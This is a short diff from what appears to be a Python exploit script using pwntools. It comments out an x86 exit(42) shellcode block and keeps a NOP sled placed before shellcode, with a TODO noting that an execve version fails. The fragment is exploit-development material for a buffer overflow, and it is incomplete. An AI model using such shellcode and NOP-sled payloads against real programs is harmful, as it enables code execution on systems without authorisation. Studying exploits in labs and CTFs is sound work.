@@ -44,13 +44,13 @@ def create_payload():
     xor    edx,edx
     int    0x80 
     """
-    asm_shellcode = """
-    xor    ebx, ebx
-    xor    eax, eax
-    mov    al, 0x1
-    mov    bl, 42
-    int    0x80 
-    """
+    # asm_shellcode = """
+    # xor    ebx, ebx
+    # xor    eax, eax
+    # mov    al, 0x1
+    # mov    bl, 42
+    # int    0x80
+    # """
     # TODO Shit above works only with exit. Need to solve what's wrong with execve
     nops = b'\x90' * padding
     shellcode = asm(
